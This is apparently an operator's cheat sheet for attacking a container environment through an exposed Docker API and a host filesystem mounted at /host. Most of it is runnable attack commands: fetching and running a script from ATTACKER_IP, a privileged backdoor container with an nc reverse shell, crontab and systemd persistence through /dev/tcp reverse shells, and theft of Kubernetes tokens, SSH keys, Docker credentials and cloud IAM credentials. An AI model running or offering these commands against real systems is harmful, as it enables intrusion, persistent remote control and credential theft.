# Quick Reference: Container Pentesting Commands

## Current Setup
- Container ID: `772ad9325f2ca981e106c0e5935bed0732fae95122a8fe34c2dbe166e610b932`
- Docker API: `http://localhost:2375`
- Host filesystem: mounted at `/host`

## Quick Commands

### 1. Run All Enumeration
```bash
# Copy scripts to container and run
curl -s -X POST -H "Content-Type: application/json" \
  http://localhost:2375/containers/772ad9325f2ca981e106c0e5935bed0732fae95122a8fe34c2dbe166e610b932/exec \
  -d '{"Cmd":["sh","-c","cd /tmp && wget -q http://ATTACKER_IP/run_all_enum.sh && sh run_all_enum.sh"],"AttachStdout":true,"AttachStderr":true}'
```

### 2. Quick Docker Enumeration
```bash
# List containers
curl -s http://localhost:2375/containers/json | python3 -m json.tool

# List images  
curl -s http://localhost:2375/images/json | python3 -m json.tool

# Docker info
curl -s http://localhost:2375/info | python3 -m json.tool
```

### 3. Quick Kubernetes Check
```bash
# Check for service account
chroot /host cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null

# If token exists, access API
KUBE_TOKEN=$(chroot /host cat /var/run/secrets/kubernetes.io/serviceaccount/token)
KUBE_CA=/host/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
KUBE_NS=$(chroot /host cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -s --cacert $KUBE_CA \
  -H "Authorization: Bearer $KUBE_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$KUBE_NS/pods
```

### 4. Quick Host Enumeration
```bash
# Host ID
chroot /host /usr/bin/id

# Network info
cat /host/proc/net/route
cat /host/proc/net/arp

# Find credentials
find /host -name ".docker" -type d 2>/dev/null
find /host -path "*/.kube/config" 2>/dev/null
find /host -path "*/serviceaccount/token" 2>/dev/null
```

### 5. Create Backdoor Container
```bash
# Reverse shell container
curl -X POST -H "Content-Type: application/json" \
  http://localhost:2375/containers/create \
  -d '{
    "Image": "busybox:1",
    "Cmd": ["sh", "-c", "while true; do nc -e /bin/sh ATTACKER_IP 4444 2>/dev/null || sleep 60; done"],
    "HostConfig": {
      "RestartPolicy": {"Name": "always"},
      "Privileged": true,
      "NetworkMode": "host"
    }
  }'
```

### 6. Access Other Containers
```bash
# Get container list
CONTAINERS=$(curl -s http://localhost:2375/containers/json | \
  python3 -c "import sys, json; [print(c['Id']) for c in json.load(sys.stdin)]")

# Exec into first container
FIRST_CONTAINER=$(echo $CONTAINERS | head -1)
EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
  http://localhost:2375/containers/$FIRST_CONTAINER/exec \
  -d '{"Cmd":["id"],"AttachStdout":true}' | \
  python3 -c "import sys, json; print(json.load(sys.stdin)['Id'])")

curl -s -X POST -H "Content-Type: application/json" \
  http://localhost:2375/exec/$EXEC_ID/start \
  -d '{"Detach":false}'
```

### 7. Cloud Provider Checks
```bash
# AWS
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP  
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Azure
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 8. Persistence
```bash
# Add to host crontab
echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /host/etc/crontab

# Create systemd service
cat > /host/etc/systemd/system/backdoor.service <<EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
chroot /host systemctl enable backdoor.service
```

## Common Escalation Paths

1. **Docker → Other Containers**: Use Docker API to exec into other containers
2. **Container → Host**: Already have host access via mount, can modify host files
3. **Pod → Cluster**: Use service account token to access Kubernetes API
4. **Container → Cloud**: Check for cloud metadata endpoints
5. **Credentials → Lateral**: Reuse found credentials (SSH keys, Docker configs, kubeconfigs)

## Important Files to Check

- `/host/root/.docker/config.json` - Docker registry credentials
- `/host/root/.ssh/id_rsa` - SSH private keys
- `/host/var/run/secrets/kubernetes.io/serviceaccount/token` - K8s service account
- `/host/etc/kubernetes/admin.conf` - K8s admin config
- `/host/var/lib/kubelet/` - Kubelet data
- `/host/proc/net/tcp` - Listening services
- `/host/etc/crontab` - Scheduled tasks
